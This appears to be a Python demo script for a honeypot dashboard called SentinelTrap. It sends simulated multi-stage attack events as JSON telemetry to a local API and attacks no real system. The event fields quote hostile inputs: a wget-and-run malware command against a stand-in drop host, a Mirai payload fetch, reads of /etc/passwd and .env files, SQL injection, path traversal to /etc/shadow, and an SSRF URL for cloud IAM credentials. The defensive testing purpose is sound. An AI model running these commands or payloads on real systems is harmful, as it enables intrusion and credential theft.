#!/usr/bin/env python3
"""
SentinelTrap - Multi-Protocol Attack Simulator & Presentation Demo Script
Simulates realistic multi-stage cyber attacks across all honeypot services:
1. Reconnaissance (Nmap Port Scanning)
2. Initial Access & Brute Force (SSH & Telnet)
3. IoT Botnet Malware Ingestion (Mirai wget payload)
4. Web Vulnerability Exploitation (SQLi, Path Traversal, SSRF, Honeytoken harvesting)
5. Database & Cache Probing (MySQL & Redis)
6. Exfiltration & Mail Relay Abuse (SMTP & FTP)
Generates real-time telemetry events for dashboard & report validation.
"""

import os
import sys
import time
import socket
import json
import urllib.request
import urllib.parse

BACKEND_URL = os.getenv("BACKEND_URL", "http://127.0.0.1:8000/api/events")

ATTACK_IPS = ["185.220.101.5", "45.154.255.88", "193.142.146.210", "192.168.1.105"]

def send_event(ip_address, protocol, event_type, input_data="", vuln_code=None, username=None, password=None):
    payload = {
        "ip_address": ip_address,
        "protocol": protocol,
        "event_type": event_type,
        "input_data": input_data,
        "vulnerability_code": vuln_code,
        "username_attempted": username,
        "password_attempted": password
    }
    print(f"[SIMULATOR] -> [{protocol}] {event_type} (Code={vuln_code}) | Input: {input_data[:60]}")
    try:
        req = urllib.request.Request(
            BACKEND_URL,
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=2) as resp:
            pass
    except Exception as e:
        print(f"[-] Simulator Telemetry Error: {e}")

def run_simulation():
    print("============================================================")
    print("      SentinelTrap - Multi-Stage Attack Traffic Simulator   ")
    print("============================================================")
    print(f"[*] Target API : {BACKEND_URL}")
    print("[*] Generating synthetic multi-protocol attack stream...")
    print("--------------------------------================------------\n")

    # Stage 1: Network Reconnaissance (Nmap Port Scan)
    print("--> STAGE 1: Network Reconnaissance (Nmap Port Scan)")
    for port in [21, 22, 23, 25, 80, 3306, 6379, 8080]:
        send_event(
            ip_address="185.220.101.5",
            protocol=f"PORT_{port}",
            event_type="nmap_port_scan",
            input_data=f"Nmap SYN scan probe on port {port}",
            vuln_code="NMAP_RECON"
        )
        time.sleep(0.3)

    # Stage 2: SSH Brute Force
    print("\n--> STAGE 2: SSH Brute-Force Login Probes")
    creds = [("admin", "admin"), ("root", "123456"), ("sysadmin", "P@ssw0rd2026"), ("root", "toor")]
    for user, pwd in creds:
        send_event(
            ip_address="45.154.255.88",
            protocol="SSH",
            event_type="login_attempt",
            input_data=f"SSH auth attempt user='{user}'",
            vuln_code="WPH",
            username=user,
            password=pwd
        )
        time.sleep(0.4)

    # Stage 3: SSH Keystrokes & Command Injection
    print("\n--> STAGE 3: SSH Interactive Shell Execution & Credential Harvesting")
    commands = [
        ("whoami", None),
        ("uname -a", None),
        ("cat /etc/passwd", "SIL"),
        ("cat /var/www/html/.env", "HC"),
        ("wget http://malware-drop.ru/x86_bot; chmod +x x86_bot; ./x86_bot", "UCE")
    ]
    for cmd, vcode in commands:
        send_event(
            ip_address="45.154.255.88",
            protocol="SSH",
            event_type="command_execution",
            input_data=cmd,
            vuln_code=vcode
        )
        time.sleep(0.5)

    # Stage 4: IoT Telnet Botnet Attack (Mirai Probe)
    print("\n--> STAGE 4: IoT Telnet Botnet Intrusion (Mirai Payload)")
    send_event("193.142.146.210", "TELNET", "login_attempt", "Telnet auth attempt", "WPH", "root", "xc3511")
    send_event("193.142.146.210", "TELNET", "command_execution", "enable; system; shell", "HC")
    send_event("193.142.146.210", "TELNET", "command_execution", "wget http://193.142.146.210/mirai.mips; chmod +x mirai.mips", "UCE")
    time.sleep(0.5)

    # Stage 5: Web Application Vulnerability Probes
    print("\n--> STAGE 5: Web Application Exploitation (SQLi, Path Traversal, SSRF)")
    send_event("192.168.1.105", "HTTP", "login_attempt", "POST /login - Payload: admin' OR '1'='1'--", "PSI", "admin'--", "password")
    send_event("192.168.1.105", "HTTP", "path_traversal_attempt", "GET /download?file=../../../../etc/shadow", "UFH")
    send_event("192.168.1.105", "HTTP", "ssrf_attempt", "GET /api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials", "SSRF")
    send_event("192.168.1.105", "HTTP", "secret_harvesting_attempt", "GET /.env", "HC")
    time.sleep(0.5)

    # Stage 6: Database & FTP Traps
    print("\n--> STAGE 6: Database & File Transfer Traps")
    send_event("185.220.101.5", "MYSQL", "database_access_attempt", "CONNECT root@10.0.8.22:3306 - SELECT * FROM users", "PSI")
    send_event("185.220.101.5", "FTP", "file_upload_attempt", "STOR rootkit.sh", "UFH")
    send_event("185.220.101.5", "SMTP", "open_relay_probe", "RCPT TO: <spammer@target.com>", "UCE")

    print("\n============================================================")
    print("[+] Multi-Stage Simulation Complete!")
    print("[+] All attack telemetry events transmitted to SentinelTrap API.")
    print("============================================================")

if __name__ == '__main__':
    run_simulation()
